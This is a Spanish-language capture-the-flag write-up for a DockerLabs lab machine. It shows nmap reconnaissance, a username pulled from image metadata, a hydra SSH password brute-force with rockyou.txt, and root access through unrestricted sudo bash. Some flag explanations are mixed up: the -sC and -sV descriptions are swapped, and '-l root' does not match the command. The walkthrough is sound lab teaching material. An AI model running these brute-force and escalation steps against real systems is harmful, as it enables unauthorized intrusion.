## WRITEUP DE LA MÁQUINA BORAZUWARAHCTF DE DOCKERLABS EN ESPAÑOL

Sitio web - https://dockerlabs.es/#/

```shell
└─$ nmap -sC -sV -p- -n --min-rate 5000 172.17.0.2 -oN outputscan.txt
```
"-sC" Muestra la versión del servicio del puerto abierto.
<br>
"-sV" Ejecuta scripts propios de Nmap que, entre otras cosas, descubren información detallada sobre los servicios.
<br>
"-p-" Escanea todos los 65535 puertos TCP.
<br>
"-n" Desactiva la resolución de nombres DNS.
<br>
"--min-rate 5000" Ajusta la tasa mínima de envío de paquetes a 5000 paquetes por segundo, acelerando el escaneo.
<br>
"172.17.0.2" Es la dirección IP de la máquina víctima.
<br>
"-oN outputscan.txt" Sirve para que te copie el resultado del escaneo en el fichero que tú le indiques (no hay que crearlo antes, lo crea solo). Esto lo hago por si más tarde quiero volver a ver el escaneo pero no quiero tener que hacerlo de nuevo.

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-29 12:33 EDT
Nmap scan report for 172.17.0.2
Host is up (0.00011s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
|_  256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.59 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds
```
Vemos que los puertos 22 y 80 estan abiertos (servicios ssh y http respectivamente). Vamos a ingresar la ip de la máquina víctima en cualquier navegador para observar que tenemos.
<br><br>
![Foto de la pagina web](https://github.com/1A2N6K7/DockerLabs-WriteUps/assets/94070438/fa394feb-c077-46ca-bf1e-7e7b3e52798a)
der.JPG)
Vemos que solo hay una imagen jpeg, se me ocurre descargarla y mediante alguna herramienta de OSINT podamos sacar datos importantes. Esto lo haremos con la herramienta exiftool:
```
└─$ exiftool kinder.jpeg
ExifTool Version Number         : 12.76
File Name                       : kinder.jpeg
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2024:06:16 11:40:00-04:00
File Access Date/Time           : 2024:06:26 14:25:09-04:00
File Inode Change Date/Time     : 2024:06:16 11:40:00-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password:  ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207

```
De los datos obtenidos, nos llama la atencion el siguiente:

```
Description                     : ---------- User: borazuwarah ----------
``` 
Ya sabemos el nombre de usuario, por ello el próximo paso sera intentar hacer un ataque de fuerza bruta para encontrar la contraseña del usuario "borazuwarah", esto lo haremos con la herramienta "hydra":
```
└─$ hydra -l borazuwarah -P /home/kali/Desktop/rockyou.txt ssh://172.17.0.2 -t 5
```
"-l root" Indica qué nombre de usuario va a usar en el ataque, en este caso buscamos a root.
<br>
"-P /home/kali/Desktop/rockyou.txt" Especifica la wordlist de contraseñas que va a usar para probar el ataque de fuerza bruta, cada uno pone la ruta donde se encuentre su fichero wordlist.
<br>
"ssh://172.17.0.2/" Especifica el protocolo y la dirección del objetivo del ataque. En este caso, se está atacando el servicio SSH (Secure Shell) en la dirección IP 172.17.0.2
<br>
"-t 5" Especifica el número de tareas (threads) paralelas que Hydra debe usar durante el ataque. En este caso, -t 5 indica que Hydra debe utilizar 5 hilos de ejecución simultáneos para probar las combinaciones de nombre de usuario y contraseña.

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-29 13:37:58
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-29 13:38:02
```
Tenemos que para el usuario "Borazuwarah" la contraseña es "123456", para entrar lo haremos mediante ssh:

```
└─$ ssh borazuwarah@172.17.0.2 
borazuwarah@172.17.0.2's password: 
Linux f976bd56f8e8 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 26 18:26:17 2024 from 172.17.0.1
borazuwarah@f976bd56f8e8:~$ 
```
Ya somos el usuario "Burazuwarah" ahora toca el paso de siempre, ejecutar "sudo -l" y escalar privilegios:

```
borazuwarah@f976bd56f8e8:~$ sudo -l
Matching Defaults entries for borazuwarah on f976bd56f8e8:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User borazuwarah may run the following commands on f976bd56f8e8:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```
Mediante la pagina de GTFOBINS -> https://gtfobins.github.io/gtfobins/bash/#sudo
<br>
Con el siguiente comando escalaremos privilegios y conseguiremos ser root:

```
borazuwarah@f976bd56f8e8:~$ sudo bash
root@f976bd56f8e8:/home/borazuwarah# whoami
root
```
Estamos dentro. Muchas gracias y nos vemos en la próxima.
